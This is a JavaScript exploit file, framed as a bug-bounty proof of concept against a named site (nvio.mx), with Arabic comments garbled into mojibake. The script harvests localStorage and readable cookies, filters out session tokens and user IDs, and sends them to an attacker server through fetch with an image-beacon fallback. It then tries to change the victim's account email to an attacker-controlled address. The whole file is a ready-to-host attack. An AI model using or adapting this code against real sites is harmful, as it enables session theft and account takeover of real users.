// exploit.js - Full Account Takeover Chain for Bug Bounty (e.g., nvio.mx)
// Host this on: https://yourname.github.io/exploit.js

(function() {
    // 1. ØªØ¬Ù†Ù‘Ø¨ Ø§Ù„ØªÙ†ÙÙŠØ° Ø§Ù„Ù…ØªÙƒØ±Ø±
    if (window.exploitExecuted) return;
    window.exploitExecuted = true;

    // 2. Ø¬Ù…Ø¹ ÙƒÙ„ Ø¨ÙŠØ§Ù†Ø§Øª localStorage
    let localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        try {
            localStorageData[key] = localStorage.getItem(key);
        } catch (e) {}
    }

    // 3. Ø¬Ù…Ø¹ Ø§Ù„ÙƒÙˆÙƒÙŠØ§Øª (Ø¥Ù† Ù„Ù… ØªÙƒÙ† HttpOnly)
    let cookies = document.cookie;

    // 4. Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø±Ù…ÙˆØ² Ø¬Ù„Ø³Ø© Ø­Ø³Ø§Ø³Ø©
    let sensitiveKeys = ['token', 'auth', 'session', 'userId', 'usrId', 'accessToken', 'jwt', 'apc_session', 'apc_user_id'];
    let sessionTokens = {};
    for (let key in localStorageData) {
        if (sensitiveKeys.some(s => key.toLowerCase().includes(s))) {
            sessionTokens[key] = localStorageData[key];
        }
    }

    // 5. Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø±Ù‚Ø© session cookies (Ø¥Ù† Ø£Ù…ÙƒÙ†)
    let sessionCookies = {};
    let cookieArr = cookies.split(';');
    sensitiveKeys.forEach(k => {
        cookieArr.forEach(c => {
            let [name, val] = c.trim().split('=');
            if (name && name.toLowerCase().includes(k.toLowerCase())) {
                sessionCookies[name] = val;
            }
        });
    });

    // 6. Ø¨Ù†Ø§Ø¡ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø±ÙˆÙ‚Ø§Øª
    const stolenData = {
        url: window.location.href,
        domain: document.domain,
        localStorage: localStorageData,
        cookies: cookies,
        sessionTokens: sessionTokens,
        sessionCookies: sessionCookies,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };

    // 7. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø®Ø§Ø¯Ù…Ùƒ (Ø§Ø³ØªØ¨Ø¯Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· Ø¨Ø®Ø§Ø¯Ù…Ùƒ)
    const attackerServer = 'https://your-bugbounty-server.com/steal';

    // Ù…Ø­Ø§ÙˆÙ„Ø© via fetch (Ù…Ø¹ CORS Ù…ÙØ¹Ø·Ù‘Ù„)
    fetch(attackerServer, {
        method: 'POST',
        mode: 'no-cors',
        keepalive: true,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(stolenData)
    }).catch(() => {
        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¯ÙŠÙ„Ø© Ø¹Ø¨Ø± <img> Ù„ØªØ®Ø·ÙŠ CORS
        let img = new Image();
        img.src = `${attackerServer}?data=${encodeURIComponent(btoa(JSON.stringify(stolenData)))}`;
    });

    // 8. Ù…Ø­Ø§ÙˆÙ„Ø© ØªØºÙŠÙŠØ± Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ (Ø¥Ø°Ø§ ÙˆÙØ¬Ø¯Øª Ø±Ù…ÙˆØ² ÙƒØ§ÙÙŠØ©)
    const emailChangeEndpoint = 'https://nvio.mx/api/user/email'; // âœ”ï¸ ØªØ£ÙƒØ¯ Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ù…Ø³Ø§Ø± Ø¹Ø¨Ø± Network Tab
    const potentialUserId = sessionTokens.userId || sessionTokens.usrId || Object.values(sessionTokens)[0];
    const potentialToken = sessionTokens.token || sessionTokens.accessToken || localStorageData['auth_token'];

    if (potentialUserId && (potentialToken || Object.keys(sessionCookies).length > 0)) {
        const changeEmailPayload = {
            newEmail: "attacker+test@bugbounty.com", // âœ‰ï¸ Ø¨Ø±ÙŠØ¯ ØªØ­Øª Ø³ÙŠØ·Ø±ØªÙƒ
            userId: potentialUserId
        };

        const headers = {
            'Content-Type': 'application/json'
        };

        // Ø¥Ø¶Ø§ÙØ© Authorization header Ø¥Ù† ÙˆÙØ¬Ø¯
        if (potentialToken) {
            headers['Authorization'] = `Bearer ${potentialToken}`;
        }

        // Ø¥Ø¶Ø§ÙØ© ÙƒÙˆÙƒÙŠØ§Øª Ø­Ø³Ø§Ø³Ø© ÙƒØ±Ø¤ÙˆØ³ (Ø¥Ù† Ù„Ù… ØªÙƒÙ† HttpOnly)
        if (sessionCookies['session']) {
            headers['x-session-id'] = sessionCookies['session'];
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ ØªØºÙŠÙŠØ± Ø§Ù„Ø¨Ø±ÙŠØ¯ (Ø­ØªÙ‰ Ù„Ùˆ ÙØ´Ù„ CORSØŒ Ù‚Ø¯ ÙŠÙÙ†ÙÙ‘Ø°!)
        fetch(emailChangeEndpoint, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(changeEmailPayload),
            credentials: 'include' // Ù„ØªØ´Ù…Ù„ Ø§Ù„ÙƒÙˆÙƒÙŠØ§Øª
        }).then(res => {
            // Ø³Ø¬Ù‘Ù„ Ø§Ù„Ù†Ø¬Ø§Ø­/Ø§Ù„ÙØ´Ù„ ÙÙŠ ÙˆØ­Ø¯Ø© Ø§Ù„ØªØ­ÙƒÙ… (Ù…ÙÙŠØ¯ ÙÙŠ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ)
            console.log(`[+] Email change attempt sent. Status: ${res.status}`);
        }).catch(err => {
            console.log(`[-] Email change failed:`, err);
        });
    }

    // 9. ØªÙ†Ø¨ÙŠÙ‡ Ø¨ØµØ±ÙŠ (Ø§Ø®ØªÙŠØ§Ø±ÙŠ - Ù„Ø¥Ø«Ø¨Ø§Øª Ø§Ù„ØªÙ†ÙÙŠØ° ÙÙŠ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ)
    console.log(`[ğŸ”¥] EXPLOIT EXECUTED on ${document.domain} â€” Data exfiltrated.`);
})();
